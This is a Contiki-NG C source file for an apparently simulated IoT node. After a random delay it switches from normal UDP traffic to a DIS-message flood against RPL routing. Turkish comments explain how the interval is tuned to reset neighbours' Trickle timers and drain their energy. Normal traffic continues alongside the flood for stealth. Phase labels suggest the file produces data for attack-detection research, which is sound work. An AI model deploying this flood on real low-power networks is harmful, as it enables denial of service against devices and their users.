#include "contiki.h"
#include "net/routing/routing.h"
#include "random.h"
#include "net/netstack.h"
#include "net/ipv6/simple-udp.h"
#include "net/mac/4emac/4emac-private.h"
#include "net/app-layer/attack-analyzer/attacker-analyzer.h"
#include "net/routing/rpl-classic/rpl.h"
#include "net/routing/rpl-classic/rpl-private.h"

#include "sys/log.h"
#define LOG_MODULE "App"
#define LOG_LEVEL LOG_LEVEL_INFO

/* For normal mode */
#define UDP_CLIENT_PORT 8765
#define UDP_SERVER_PORT 5678
#define NORMAL_SEND_INTERVAL (15 * CLOCK_SECOND)
#define JRC_IP_ADDR { 0xfd, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05 }
static uip_ipaddr_t jrc_ip_addr;
static struct simple_udp_connection udp_conn;

/*
 * v4: GERCEK DIS flood. [60s,120s] aralik literatur acisindan flood degildi
 * (normal join-sonrasi DIS ~0; aralik DIO Trickle'in Imin=2^12ms~4s'den cok
 * yavasti, komsu Trickle tamamen toparlaniyordu). Aralik Imin civarina/altina
 * cekildi: jitter'li [2s,6s]. Bu, komsularin DIO Trickle timer'ini Imin'e
 * pinler -> gercek DIO firtinasi + enerji tuketimi imzasi.
 * NOT: dis_sent feature'i bu yuzden guclu bir imza birakir (beklenen, dogru
 * davranis). Non-trivial siniflandirma stealth'i artik aralik dusurmekten
 * DEGIL, kosu-basi rastgele saldirgan kimligi + on/off pencerelerinden gelir.
 */
#define ATTACK_MIN_INTERVAL (2 * CLOCK_SECOND)
#define ATTACK_MAX_INTERVAL (6 * CLOCK_SECOND)
/* Stabilizasyon bekleme: gercek flood'da parent/rank dalgalanmasinda durmak
 * flood'u baltalar (flood'un kendisi bu dalgalanmayi yaratir). 0 = devre disi;
 * mantik dursa bile en fazla tek bir DIS atlanir. */
#define STABILITY_HOLDOFF   (0)
/* Saldiri moduna gecince ilk DIS oncesi kisa yerlesme (eski 120s flood'un
 * ilk ~2 dk'sini yiyordu). */
#define ATTACK_INITIAL_HOLDOFF (5 * CLOCK_SECOND)

/*
 * Faz gecisi icin sure: 30-min headless run semasinda 3. dk sonunda
 * (attacker-analyzer warmup'i bittiginde) atak fazi acilir. DIS saldirisi
 * routing-independent oldugu icin DODAG katilim faz suresine ihtiyac yok.
 */
#define ATTACK_DELAY_MIN (20 * 60 * CLOCK_SECOND)  // 60-min run; attack start random in [20,25] min
#define ATTACK_DELAY_MAX (25 * 60 * CLOCK_SECOND)

/*---------------------------------------------------------------------------*/
PROCESS(hybrid_client_process, "Hybrid Normal/DIS-Attack client");
AUTOSTART_PROCESSES(&hybrid_client_process);
/*---------------------------------------------------------------------------*/
static void
udp_rx_callback(struct simple_udp_connection *c,
         const uip_ipaddr_t *sender_addr,
         uint16_t sender_port,
         const uip_ipaddr_t *receiver_addr,
         uint16_t receiver_port,
         const uint8_t *data,
         uint16_t datalen)
{
  unsigned count = *(unsigned *)data;
  LOG_INFO("Received response %u from ", count);
  LOG_INFO_6ADDR(sender_addr);
  LOG_INFO_("\n");
}
/*---------------------------------------------------------------------------*/
PROCESS_THREAD(hybrid_client_process, ev, data)
{
    static struct etimer periodic_timer;
    static struct etimer attack_delay_timer;
    static struct etimer app_send_timer;
    static unsigned count = 0;
    uip_ipaddr_t dest_ipaddr;
    /* Rota stabilitesi izleme icin yerel durum */
    static uip_ipaddr_t last_parent_ip_local;
    static uint16_t last_rank_local = 0;
    static clock_time_t holdoff_until = 0;

    PROCESS_BEGIN();

    /* --- Normal calisma icin baslangic --- */
    uint8_t jrc_addr[16] = JRC_IP_ADDR;
    memcpy(jrc_ip_addr.u8, jrc_addr, 16);
    simple_udp_register(&udp_conn, UDP_CLIENT_PORT, NULL,
                        UDP_SERVER_PORT, udp_rx_callback);
    foure_timesynch_init(0);

    /* Rota stabilitesi izleme baslangic durumu */
    uip_create_unspecified(&last_parent_ip_local);

    /* Attacker analyzer'i baslat: Ilk fazda etiket ataksiz (0, ATTACK_TYPE_NONE) */
    attacker_analyzer_init(0, &udp_conn, (void *)&jrc_ip_addr, (unsigned short)UDP_SERVER_PORT, 0, ATTACK_TYPE_NONE);

    LOG_INFO("Dugum normal modda basliyor. 15 dakika sonra DIS saldirisi baslayacak.\n");
    clock_time_t attack_delay = ATTACK_DELAY_MIN + (random_rand() % (ATTACK_DELAY_MAX - ATTACK_DELAY_MIN));
    LOG_INFO("Attack delay drawn: %lu sec (uniform [20,25] min)\n", (unsigned long)(attack_delay / CLOCK_SECOND));
    etimer_set(&attack_delay_timer, attack_delay);
    etimer_set(&periodic_timer, random_rand() % NORMAL_SEND_INTERVAL);

    /* --- Normal Faz Dongusu (ilk 15 dakika) --- */
    while(!etimer_expired(&attack_delay_timer)) {
        PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer));


        if(NETSTACK_ROUTING.node_is_reachable() && NETSTACK_ROUTING.get_root_ipaddr(&dest_ipaddr)) {
            LOG_INFO("Sending normal UDP packet %u to ", count);
            LOG_INFO_6ADDR(&dest_ipaddr);
            LOG_INFO_("\n");
            {
              uint32_t packed = attacker_pack_app_pkt((uint32_t)count);
              simple_udp_sendto(&udp_conn, &packed, sizeof(packed), &dest_ipaddr);
            }
            count++;
            /* Update packet count for analyzer */
            attacker_analyzer_set_app_packet_count(count);
        } else {
            LOG_INFO("Normal mod: Henuz erisilebilir degil\n");
        }

        /* Add some jitter */
        etimer_set(&periodic_timer, NORMAL_SEND_INTERVAL
          - CLOCK_SECOND + (random_rand() % (2 * CLOCK_SECOND)));
    }

    /* --- Saldiri Faz Dongusu --- */
    LOG_INFO("Saldiri fazi basladi. DIS mesajlari periyodik olarak gonderilecek.\n");
    /* Etiketi saldiri olarak guncelle: 1, ATTACK_TYPE_DIS */
    attacker_analyzer_set_attack_mode(1, ATTACK_TYPE_DIS);
    /* Ilk gonderim oncesi BEKLEME: kisa yerlesme (ATTACK_INITIAL_HOLDOFF), uzerine [ATTACK_MIN, ATTACK_MAX) rastgele */
    {
      clock_time_t delta = (ATTACK_MAX_INTERVAL > ATTACK_MIN_INTERVAL) ? (ATTACK_MAX_INTERVAL - ATTACK_MIN_INTERVAL) : 0;
      clock_time_t off = (delta > 0) ? (clock_time_t)(random_rand() % delta) : 0;
      etimer_set(&periodic_timer, ATTACK_INITIAL_HOLDOFF + ATTACK_MIN_INTERVAL + off);
    }

    etimer_set(&app_send_timer, NORMAL_SEND_INTERVAL);

    while(1) {
        PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer) ||
                                 etimer_expired(&app_send_timer));

        /* --- DIS attack branch --- */
        if(etimer_expired(&periodic_timer)) {
          /* --- Rota/Senkron stabilitesi kontrolu --- */
          int can_send = 1;
          clock_time_t now = clock_time();
          if(now < holdoff_until) {
            can_send = 0;
          }
          if(can_send && !NETSTACK_ROUTING.node_is_reachable()) {
            can_send = 0;
          }
          if(can_send) {
            rpl_dag_t *dag = rpl_get_any_dag();
            if(dag && dag->preferred_parent) {
              const uip_ipaddr_t *p = rpl_parent_get_ipaddr(dag->preferred_parent);
              uint16_t rank_now = dag->rank;
              if(!uip_ipaddr_cmp(&last_parent_ip_local, p)) {
                uip_ipaddr_copy(&last_parent_ip_local, p);
                holdoff_until = now + STABILITY_HOLDOFF;
                can_send = 0;
                LOG_INFO("DIS atlandi: yeni parent, stabilizasyon bekleniyor.\n");
              } else if((last_rank_local != 0) && (rank_now > last_rank_local ? (rank_now - last_rank_local) : (last_rank_local - rank_now)) >= 256) {
                holdoff_until = now + STABILITY_HOLDOFF;
                can_send = 0;
                LOG_INFO("DIS atlandi: rank dalgalanmasi, stabilizasyon bekleniyor.\n");
              }
              last_rank_local = rank_now;
            }
          }
          if(can_send) {
            LOG_INFO("Sending a DIS message (multicast)\n");
            dis_output(NULL);
          }
          {
            clock_time_t delta = (ATTACK_MAX_INTERVAL > ATTACK_MIN_INTERVAL) ? (ATTACK_MAX_INTERVAL - ATTACK_MIN_INTERVAL) : 0;
            clock_time_t off = (delta > 0) ? (clock_time_t)(random_rand() % delta) : 0;
            etimer_set(&periodic_timer, ATTACK_MIN_INTERVAL + off);
          }
        }

        /* --- Normal app-send branch (stealth: keep sending UDP during attack) --- */
        if(etimer_expired(&app_send_timer)) {
          if(NETSTACK_ROUTING.node_is_reachable() && NETSTACK_ROUTING.get_root_ipaddr(&dest_ipaddr)) {
            uint32_t packed = attacker_pack_app_pkt((uint32_t)count);
            simple_udp_sendto(&udp_conn, &packed, sizeof(packed), &dest_ipaddr);
            count++;
            attacker_analyzer_set_app_packet_count(count);
          }
          etimer_set(&app_send_timer, NORMAL_SEND_INTERVAL - CLOCK_SECOND + (random_rand() % (2 * CLOCK_SECOND)));
        }
    }

    PROCESS_END();
}
/*---------------------------------------------------------------------------*/